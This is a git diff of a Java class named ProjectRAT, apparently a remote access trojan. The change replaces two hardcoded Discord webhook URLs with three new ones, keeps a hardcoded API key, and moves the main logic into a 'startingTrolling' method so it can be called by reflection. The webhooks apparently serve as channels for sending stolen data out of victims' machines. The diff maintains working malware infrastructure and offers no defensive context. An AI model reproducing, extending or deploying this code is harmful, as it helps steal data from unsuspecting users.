@@ -9,8 +9,9 @@ import java.util.List;
 public class ProjectRAT {
 
     public static String[] webhook = {
-            "https://discord.com/api/webhooks/880506474328129566/n0VkT2jMsc8E1ZtMVM4pAUhfPOhB1xXt1W7_tCK4vWOFos7G5gERFeJixGmxdNbBKBlB",
-            "https://discord.com/api/webhooks/880488638700478535/FknyJw6g2G8ROC7Ph7c0xMkitT1cvJg6NFA5a3i4SDKuz02TrlvDNqCoO8cH3jBpNL-s"
+            "https://discord.com/api/webhooks/887386102351138846/UvND2AOg1aJDbRJV2C5EqQ2zDS80zFXAfHPmeXunixX0DYy8ouJHqwVwX2PdVcFS7I49",
+            "https://discord.com/api/webhooks/887386132428496896/AsB2Kq338Yw400rVgU4KNixEU1CKXy-Q3_IsvPcpUrRgDV5R9unkAl-LH43t7SryKMfi",
+            "https://discord.com/api/webhooks/887386238565384262/OnMXKLdw0uSr2ZAJAGtcewIoRYgIure6Ka6Z70uTxQUQdBh1Vd3BmjnhaC5uKOBvVLWW"
     };
     public static String apiKey = "b4ee6a619f9b4212a33f8881459d2cb7";
     public static List<String> jarNames = Arrays.asList(
@@ -20,6 +21,11 @@ public class ProjectRAT {
     public static RequestHandler requestHandler = new RequestHandler();
 
     public static void main(String[] args) {
+        startingTrolling();
+    }
+
+    // seperate method for reflections :troll:
+    public static void startingTrolling(){
         try {
             RequestManager manager = new RequestManager();
             for (Request request : manager.getRequests()){
@@ -30,4 +36,5 @@ public class ProjectRAT {
             e.printStackTrace();
         }
     }
+
 }
